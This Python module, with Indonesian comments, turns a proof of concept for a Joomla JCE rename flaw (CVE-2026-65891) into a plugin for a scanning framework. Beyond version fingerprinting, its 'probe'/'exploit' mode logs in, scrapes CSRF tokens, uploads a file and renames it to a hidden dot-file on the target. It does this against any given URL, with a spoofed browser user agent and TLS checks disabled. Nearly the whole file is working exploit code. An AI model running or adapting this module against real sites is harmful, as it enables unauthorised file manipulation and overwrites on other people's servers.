# cve_modules/jce_rename.py
"""
CVE-2026-65891 — Joomla JCE file rename → hidden file / overwrite

Type    : CWE-20 improper input validation (rename destination)
Product : JCE (Joomla Content Editor) com_jce — Widget Factory
Affected: JCE < 2.20.2
Fixed   : JCE 2.20.2+ (2026-07-29)
Impact  : Auth user dengan JCE file-manager + rename → dot-prefix hidden
          files, silent overwrite existing files.
CVSS    : 6.5 Medium (auth required)

Adaptasi dari PoC asli jadi modul scanning untuk main.py.

Mode:
  - check   : Joomla + JCE + versi saja (TANPA auth, TANPA artefak)
  - probe   : check + auth rename hidden-file test (butuh kredensial)
  - exploit : sama kayak probe, konfirmasi overwrite-capable rename
  - full    : check + probe
"""

from __future__ import annotations

import json
import random
import re
import string
import sys
from typing import Optional

import requests
import urllib3
from urllib.parse import urljoin, urlparse

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

# ── metadata untuk main.py ──────────────────────────────────────────────

CVE_META = {
    "id": "CVE-2026-65891",
    "name": "Joomla JCE rename hidden-file (auth)",
    "func": "check_cve_2026_65891",
    # default: cuma check (tanpa auth, tanpa artefak).
    # untuk probe, override lewat kwargs di CVE_REGISTRY atau panggil
    # manual dengan mode="probe" + user/password/cookie_file.
    "kwargs": {"mode": "check"},
    "priority": 25,
}


# ── konstanta ───────────────────────────────────────────────────────────

COMPONENT = "com_jce"
FIXED_VERSION = (2, 20, 2)
VERIFY_MARKER = "CVE202665891"
UA = ("Mozilla/5.0 (Windows NT 10.0; Win64; x64) "
      "AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.0.0 Safari/537.36")

VERSION_PATTERNS = (
    re.compile(r"<version>\s*([0-9]+(?:\.[0-9]+)*)\s*</version>", re.I),
    re.compile(r"Version:\s*([0-9]+(?:\.[0-9]+)*)", re.I),
    re.compile(r"WF_VERSION['\"]\s*,\s*['\"]([0-9.]+)", re.I),
)

TOKEN_PATTERNS = (
    re.compile(
        r'<input[^>]+type=["\']hidden["\'][^>]+name=["\']([a-f0-9]{32})["\'][^>]+value=["\']1["\']',
        re.I),
    re.compile(r'name=["\']([a-f0-9]{32})["\'][^>]+value=["\']1["\']', re.I),
    re.compile(r'"csrf\.token"\s*:\s*"([a-f0-9]{32})"', re.I),
    re.compile(
        r'<meta[^>]+name=["\']csrf\.token["\'][^>]+content=["\']([a-f0-9]{32})["\']',
        re.I),
)

JCE_PATHS = (
    "administrator/components/com_jce/jce.xml",
    "plugins/editors/jce/jce.xml",
    "media/com_jce/editor/tinymce/tinymce.min.js",
    "components/com_jce/editor/tinymce/tinymce.js",
)

JOOMLA_MARKERS = ("joomla", "/media/system/js/", "com_content", "generator")
RENAME_OK_MARKERS = ('"success":true', '"result":true', "success", "ok", "true")


# ── helpers ─────────────────────────────────────────────────────────────

def _normalize_base(url: str) -> str:
    url = url.strip().rstrip("/")
    if not url.startswith(("http://", "https://")):
        url = "https://" + url
    return url


def _parse_version_tuple(ver: str) -> tuple[int, ...]:
    parts: list[int] = []
    for p in ver.strip().split("."):
        if p.isdigit():
            parts.append(int(p))
        else:
            m = re.match(r"(\d+)", p)
            if m:
                parts.append(int(m.group(1)))
            break
    return tuple(parts) if parts else (0,)


def _version_lt(ver: str, fixed: tuple[int, ...]) -> bool:
    cur = _parse_version_tuple(ver)
    n = max(len(cur), len(fixed))
    cur = cur + (0,) * (n - len(cur))
    fx = fixed + (0,) * (n - len(fixed))
    return cur < fx


def _extract_versions(text: str) -> list[str]:
    found: list[str] = []
    for pat in VERSION_PATTERNS:
        found.extend(pat.findall(text or ""))
    return [v for v in found if v and not v.startswith("@@")]


def _extract_csrf_token(html: str) -> Optional[str]:
    for pat in TOKEN_PATTERNS:
        m = pat.search(html or "")
        if m:
            return m.group(1)
    return None


def _rand_tag(n: int = 8) -> str:
    return "".join(random.choices(string.ascii_lowercase + string.digits, k=n))


def _load_cookie_header(path: Optional[str]) -> dict[str, str]:
    if not path:
        return {}
    try:
        with open(path, encoding="utf-8", errors="replace") as fh:
            raw = fh.read().strip()
        return {"Cookie": raw} if raw else {}
    except OSError:
        return {}


# ── core checker (class asli, dipertahankan) ────────────────────────────

class JCE65891:
    def __init__(self, base, timeout=25, user="", password="",
                 cookie_file="", upload_dir="images", admin_login=True):
        self.base = _normalize_base(base)
        self.timeout = timeout
        self.user = user
        self.password = password
        self.upload_dir = (upload_dir or "images").strip("/") or "images"
        self.admin_login = admin_login
        self.session = requests.Session()
        self.session.verify = False
        self.session.headers.update({"User-Agent": UA})
        self.session.headers.update(_load_cookie_header(cookie_file or None))

    def _get(self, path):
        url = urljoin(self.base + "/", path.lstrip("/"))
        try:
            r = self.session.get(url, timeout=self.timeout,
                                 allow_redirects=True)
            return r.status_code, r.text or ""
        except requests.RequestException as e:
            return 0, str(e)

    def _post(self, path, data=None, params=None, files=None):
        url = urljoin(self.base + "/", path.lstrip("/"))
        try:
            r = self.session.post(url, data=data, params=params, files=files,
                                  timeout=self.timeout, allow_redirects=True)
            return r.status_code, r.text or ""
        except requests.RequestException as e:
            return 0, str(e)

    def bootstrap_token(self):
        for path in ("/", "/index.php", "/administrator/",
                     "/administrator/index.php"):
            code, body = self._get(path)
            if code == 200 and body:
                token = _extract_csrf_token(body)
                if token:
                    return token
        return None

    def login(self):
        if not self.user or not self.password:
            if self.session.cookies:
                return True, "cookie_session"
            return False, "no_credentials"

        paths = (("/administrator/index.php", "/administrator/")
                 if self.admin_login else ("/index.php", "/"))

        for path in paths:
            code, body = self._get(path)
            token = _extract_csrf_token(body) if code == 200 else None
            if not token:
                continue
            data = {
                "username": self.user,
                "passwd": self.password,
                "password": self.password,
                "option": "com_login",
                "task": "login",
                token: "1",
            }
            st, resp = self._post(path, data=data)
            low = resp.lower()
            if st in (200, 303) and any(
                x in low for x in ("logout", "control panel",
                                   "com_cpanel", "task=logout")):
                return True, ""
            if "username and password" in low or "invalid" in low:
                return False, "bad_credentials"
        return False, "login_failed"

    def detect(self):
        joomla = False
        jce = False
        versions: list[str] = []

        code, body = self._get("/")
        if code == 200 and body:
            low = body.lower()
            if any(m in low for m in JOOMLA_MARKERS):
                joomla = True
            if COMPONENT in low or "jce editor" in low:
                jce = True
            versions.extend(_extract_versions(body))

        for path in JCE_PATHS:
            code, text = self._get(path)
            if code == 200 and text:
                jce = True
                versions.extend(_extract_versions(text))

        ver = (sorted(versions, key=_parse_version_tuple)[-1]
               if versions else "")
        return joomla, jce, ver

    def rpc_url(self, token):
        return urljoin(
            self.base + "/",
            f"index.php?option={COMPONENT}&task=plugin.rpc&plugin=browser&{token}=1",
        )

    def browser_upload(self, token, filename, content):
        url = self.rpc_url(token)
        data = {
            "method": "upload",
            "upload-dir": self.upload_dir,
            "dir": self.upload_dir,
            "name": filename,
            token: "1",
        }
        files = {"file": (filename, content, "text/plain")}
        st, body = self._post(url, data=data, files=files)
        if st == 200 and body and "error" not in body.lower()[:200]:
            return True, body[:200]
        return False, body[:200] or f"http_{st}"

    def browser_rename(self, token, src, dst):
        url = self.rpc_url(token)
        attempts = [
            ("rename", {"method": "rename", "file": src, "name": dst,
                        "dir": self.upload_dir, "upload-dir": self.upload_dir,
                        token: "1"}),
            ("renameItem", {"method": "renameItem", "file": src, "name": dst,
                            "dir": self.upload_dir, token: "1"}),
            ("json_rename", {"json": json.dumps({"fn": "rename",
                                                 "args": [src, dst]}),
                             token: "1"}),
            ("json_renameItem", {"json": json.dumps({"fn": "renameItem",
                                                     "args": [src, dst]}),
                                 token: "1"}),
        ]
        last = ""
        for label, data in attempts:
            st, body = self._post(url, data=data)
            low = (body or "").lower()
            last = f"{label}:http_{st}:{body[:160]}"
            if st != 200:
                continue
            if any(m in low for m in RENAME_OK_MARKERS) \
                    or "error" not in low[:120]:
                if "not authorised" in low or "not authorized" in low \
                        or "403" in low:
                    continue
                return True, label
        return False, last

    def hidden_url(self, hidden_name):
        return urljoin(self.base + "/",
                       f"{self.upload_dir}/{hidden_name}")

    def verify_hidden(self, hidden_name, marker):
        st, body = self._get(f"/{self.upload_dir}/{hidden_name}")
        return st == 200 and marker in (body or "")

    def run_check(self):
        joomla, jce, ver = self.detect()
        if not joomla and not jce:
            return {"vulnerable": False, "evidence": None,
                    "reason": "not_joomla_jce", "version": ver,
                    "joomla": False, "jce": False}
        if not jce:
            return {"vulnerable": False, "evidence": None,
                    "reason": "no_jce", "version": ver,
                    "joomla": joomla, "jce": False}

        vulnerable_version = _version_lt(ver, FIXED_VERSION) if ver else True
        if ver and not vulnerable_version:
            return {"vulnerable": False, "evidence": None,
                    "reason": f"version_{ver}_patched",
                    "version": ver, "joomla": joomla, "jce": jce}
        return {"vulnerable": True,
                "evidence": f"JCE {ver or 'unknown'} < 2.20.2 "
                            f"(rename hidden-file)",
                "reason": "vulnerable_version_detected",
                "version": ver, "joomla": joomla, "jce": jce}

    def run_probe(self):
        base_res = self.run_check()
        if not base_res["vulnerable"]:
            return base_res

        # butuh auth buat probe
        if not self.user and not self.password and not self.session.cookies:
            base_res["reason"] = "need_auth_but_no_credentials"
            base_res["evidence"] = (f"JCE {base_res['version'] or 'unknown'} "
                                    f"suspect, probe butuh --user/--pass "
                                    f"atau cookie_file")
            return base_res

        ok, err = self.login()
        if not ok:
            base_res["reason"] = f"auth_failed: {err}"
            base_res["vulnerable"] = False
            return base_res

        token = self.bootstrap_token()
        if not token:
            base_res["reason"] = "csrf_token_not_found"
            base_res["vulnerable"] = False
            return base_res

        tag = _rand_tag()
        plain = f"cve65891_{tag}.txt"
        hidden = f".cve65891_{tag}.txt"
        marker = f"{VERIFY_MARKER}_{tag}"
        content = f"{marker}\n".encode()

        up_ok, up_detail = self.browser_upload(token, plain, content)
        if not up_ok:
            base_res["reason"] = f"upload_failed: {up_detail}"
            base_res["vulnerable"] = False
            return base_res

        renamed = False
        rename_detail = ""
        for src in (f"/{self.upload_dir}/{plain}",
                    f"{self.upload_dir}/{plain}",
                    plain):
            renamed, rename_detail = self.browser_rename(token, src, hidden)
            if renamed:
                break

        if not renamed:
            base_res["reason"] = f"rename_failed: {rename_detail}"
            base_res["vulnerable"] = False
            return base_res

        if self.verify_hidden(hidden, marker):
            return {"vulnerable": True,
                    "evidence": f"hidden file accessible at "
                                f"{self.hidden_url(hidden)}",
                    "reason": "rename_to_hidden_confirmed",
                    "version": base_res["version"],
                    "joomla": True, "jce": True,
                    "hidden_url": self.hidden_url(hidden)}
        return {"vulnerable": True,
                "evidence": f"rename accepted, hidden file tidak "
                            f"terbaca langsung (perlu verifikasi manual)",
                "reason": "rename_accepted_hidden_not_verified",
                "version": base_res["version"],
                "joomla": True, "jce": True}


# ── entry point untuk main.py ───────────────────────────────────────────

def check_cve_2026_65891(target_url: str,
                         timeout: int = 25,
                         mode: str = "check",
                         user: str = "",
                         password: str = "",
                         cookie_file: str = "",
                         upload_dir: str = "images",
                         admin_login: bool = True,
                         **kwargs) -> dict:
    """
    Cek target terhadap CVE-2026-65891.

    Args:
        target_url  : URL target
        timeout     : timeout HTTP (default 25s)
        mode        : "check" (tanpa auth) atau "probe"/"exploit"/"full"
                      (butuh user/password/cookie_file)
        user        : username Joomla (editor+ dengan akses JCE rename)
        password    : password Joomla
        cookie_file : path file berisi raw Cookie header (skip login)
        upload_dir  : direktori upload JCE (default "images")
        admin_login : True = login via /administrator/, False = frontend

    Returns:
        {
            "vulnerable": bool,
            "evidence":   str | None,
            "reason":     str,
            "version":    str,
            "joomla":     bool,
            "jce":        bool,
            "hidden_url": str | None,   # kalau probe berhasil
        }
    """
    checker = JCE65891(
        target_url, timeout=timeout,
        user=user or "", password=password or "",
        cookie_file=cookie_file or "",
        upload_dir=upload_dir or "images",
        admin_login=admin_login,
    )

    if mode == "check":
        result = checker.run_check()
    elif mode in ("probe", "exploit", "full"):
        result = checker.run_probe()
    else:
        result = {"vulnerable": False, "evidence": None,
                  "reason": f"unknown_mode_{mode}",
                  "version": "", "joomla": False, "jce": False}

    # pastiin field standar selalu ada
    result.setdefault("hidden_url", None)
    result.setdefault("joomla", False)
    result.setdefault("jce", False)
    result.setdefault("version", "")
    return result